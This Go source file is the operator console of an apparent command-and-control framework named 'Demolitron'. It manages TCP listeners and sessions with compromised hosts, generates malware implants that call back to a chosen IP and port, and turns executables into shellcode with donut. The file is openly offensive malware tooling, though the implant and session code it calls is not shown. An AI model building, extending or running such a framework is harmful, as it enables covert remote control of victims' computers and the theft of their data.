package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"

	"Demolitron/pkg"

	"github.com/D3Ext/maldev/logging"
)

// Listener struct represents a TCP listener
type Listener struct {
	Port     string
	Status   string
	Listener net.Listener
	//Conns    []net.Conn // Track all connections associated with this listener if you want to do multiple
	//Conns net.Conn //Handles only 1 cnnection
	Next *Listener
}

// ListenerList represents a linked list of listeners
type ListenerList struct {
	Head *Listener
	Stop chan struct{}
}

// Session struct represents a TCP Session (each session can only have 1 net.Conn)
type Session struct {
	id       int
	Port     string
	Status   string
	Conn     net.Conn
	Hostname string
	User     string
	Next     *Session
	StopChan chan struct{}
}

// ListenerList represents a linked list of listeners
type SessionList struct {
	Head *Session
	Stop chan struct{}
}

func InitServer(notifURL string) {
	pkg.PrintASCII()
	breaching := logging.SRed("---Breaching--- ")
	listenerList := NewListenerList()
	sessionList := NewSessionList()
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(logging.SRed("DEMOLITRON >>> "))
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-]Error reading input:", err)
			continue
		}

		command = strings.TrimSpace(command)

		switch command {
		case "exit":
			fmt.Println("Terminating ...")
			os.Exit(0)
		case "": //Empty string means the user just hit enter
			continue
		case "donut":
			fmt.Println("\n[?]Turn an exe into shellcode: donut <path2exe> <outputPath>\n")
		case "generate":
			fmt.Println("\n[?]Create a implant: generate --ip <ipAddr4Listener> -p <port4Listener>\n")
		case "listen":
			fmt.Println("\n[?]Create a listener with: listen -p <port>")
			fmt.Println("[?]List active listeners: listen --ls")
			fmt.Println("[?]Close all listeners: listen --close\n")
		case "listen --ls":
			listenerList.displayListeners()
		case "listen --close":
			listenerList.closeListeners()
		case "session":
			fmt.Println("\n[?]Open a session: session --id <sessionID>")
			fmt.Println("[?]List active sessions: session --ls")
			fmt.Println("[?]Close a specific session: session --close <sessionID>")
			fmt.Println("[?]Close all sessions: session --closeAll\n")
		case "session --ls":
			sessionList.displaySessions()
		case "session --closeAll":
			sessionList.closeAllSessions()
		default:
			// Check if the command matches "listen -p <port>"
			regexClose := regexp.MustCompile(`^session --close \d+$`)
			matchClose := regexClose.FindString(command)
			regexListen := regexp.MustCompile(`^listen -p \d+$`)
			matchListen := regexListen.FindString(command)
			regexSession := regexp.MustCompile(`^session --id \d+$`)
			matchSession := regexSession.FindString(command)
			regexGenerate := regexp.MustCompile(`^generate --ip \b(?:\d{1,3}\.){3}\d{1,3}\b -p \d`) //Generated by gpt
			matchGenerate := regexGenerate.FindString(command)
			regexGenerateDbg := regexp.MustCompile(`^generateDebug --ip \b(?:\d{1,3}\.){3}\d{1,3}\b -p \d`) //Generated by gpt
			matchGenerateDbg := regexGenerateDbg.FindString(command)
			regexDonut := regexp.MustCompile(`^donut .+ .+`)
			matchDonut := regexDonut.FindString(command)
			switch {
			case matchListen != "":
				{
					port := strings.Split(command, " ")[2]
					listenerList.registerListener(port, sessionList, notifURL)
				}
			case matchSession != "":
				{
					idStr := strings.Split(command, " ")[2]
					id, _ := strconv.Atoi(idStr)
					openSession(id, sessionList)
				}
			case matchGenerate != "":
				{
					breaching = logging.SRed("[!]BeepBoop creating malware !")
					fmt.Println()
					fmt.Println(breaching)
					ip := strings.Split(command, " ")[2]
					port := strings.Split(command, " ")[4]
					generateImplant(ip, port)
				}
			case matchGenerateDbg != "":
				{
					breaching = logging.SRed("[!]BeepBoop creating malware 4 Debugging !")
					fmt.Println()
					fmt.Println(breaching)
					ip := strings.Split(command, " ")[2]
					port := strings.Split(command, " ")[4]
					generateImplantDebug(ip, port)
				}
			case matchClose != "":
				{
					idStr := strings.Split(command, " ")[2]
					id, err := strconv.Atoi(idStr)
					if err != nil {
						fmt.Println("[-]Couldn't convert from int to string")
						os.Exit(1)
					}
					sessionList.closeSession(id)
				}
			case matchDonut != "":
				{
					fileLocal := strings.Split(command, " ")[1]
					outputName := strings.Split(command, " ")[2]
					//We can execute donut.sh but i decided to execute it directly from here. Will use donut.sh for something else
					//cmd := exec.Command("./scripts/donut.sh", "donut/"+fileLocal, "Bushido/"+outputName)
					cmd := exec.Command("./scripts/donut.sh", fileLocal, outputName)
					cmd.Run()
				}
			default:
				{
					fmt.Println("\n[!]Invalid command. Use 'listen', 'session', 'generate', 'donut', 'exit'\n")
				}
			}
		}
	}
}
